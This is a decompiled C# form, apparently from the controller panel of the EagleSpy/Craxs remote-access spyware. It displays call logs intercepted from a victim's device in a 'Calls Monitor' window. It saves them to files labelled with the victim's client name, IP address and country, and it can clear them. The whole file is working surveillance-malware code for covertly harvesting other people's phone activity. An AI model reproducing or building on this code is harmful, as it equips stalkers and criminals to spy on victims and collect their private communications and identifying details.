using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200004F RID: 79
[DesignerGenerated]
public partial class EagleSpyCallLogs : Form
{
	// Token: 0x06000395 RID: 917 RVA: 0x00002879 File Offset: 0x00000A79
	public EagleSpyCallLogs()
	{
		base.Load += this.Craxscallslog_Load;
		base.Deactivate += this.Craxscallslog_Deactivate;
		this.InitializeComponent();
	}

	// Token: 0x06000396 RID: 918 RVA: 0x000547C4 File Offset: 0x000529C4
	private void Craxscallslog_Load(object sender, EventArgs e)
	{
		base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
		this.BackColor = Color.DarkRed;
		base.TransparencyKey = Color.DarkRed;
		try
		{
			if (this.ClassClient != null)
			{
				if (this.ClassClient.CALLS.Count<string>() > 0)
				{
					this.callstext.Text = "Calls Monitor...\r\nــــــــــــــــــــــ\r\n\r\n";
					string[] calls = this.ClassClient.CALLS;
					foreach (string text in calls)
					{
						try
						{
							if (text != null && text.Length > 0)
							{
								TextBox textBox;
								(textBox = this.callstext).Text = textBox.Text + text + "\r\nــــــــــــــــــــــ\r\n\r\n";
							}
						}
						catch (Exception)
						{
						}
					}
				}
				else
				{
					this.callstext.Text = "No New Calls...";
				}
			}
			this.ClassClient.isnewcall = false;
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000397 RID: 919 RVA: 0x000028AB File Offset: 0x00000AAB
	private void Checkbutton_Click(object sender, EventArgs e)
	{
		this.callstext.Text = "";
		this.ClassClient.CALLS = new string[251];
		base.Close();
	}

	// Token: 0x06000398 RID: 920 RVA: 0x00002858 File Offset: 0x00000A58
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x06000399 RID: 921 RVA: 0x000548E8 File Offset: 0x00052AE8
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.callstext.Text))
		{
			EagleAlert.Showinformation("No log found to save");
		}
		else
		{
			try
			{
				if (!Directory.Exists(this.ClassClient.FolderUSER + "\\Calls_Log"))
				{
					Directory.CreateDirectory(this.ClassClient.FolderUSER + "\\Calls_Log");
				}
				string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
				if (!File.Exists(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text))
				{
					File.Create(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text).Dispose();
					File.AppendAllText(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text, string.Concat(new string[]
					{
						"Client Name: ",
						this.ClassClient.ClientName,
						"\r\nClient IP: ",
						this.ClassClient.ClientAddressIP,
						"\r\nCountry: ",
						this.ClassClient.Country,
						"\r\nDate :",
						DateTime.Now.ToString(),
						"\r\n----------------------------------------\r\n"
					}));
				}
				File.AppendAllText(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text, text + this.callstext.Text + "\r\n");
				Process.Start(this.ClassClient.FolderUSER + "\\Calls_Log");
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600039A RID: 922 RVA: 0x00002858 File Offset: 0x00000A58
	private void Craxscallslog_Deactivate(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x04000400 RID: 1024
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	// Token: 0x04000401 RID: 1025
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x04000402 RID: 1026
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbutton")]
	private DrakeUIButtonIcon _checkbutton;

	// Token: 0x04000403 RID: 1027
	public Client ClassClient;
}
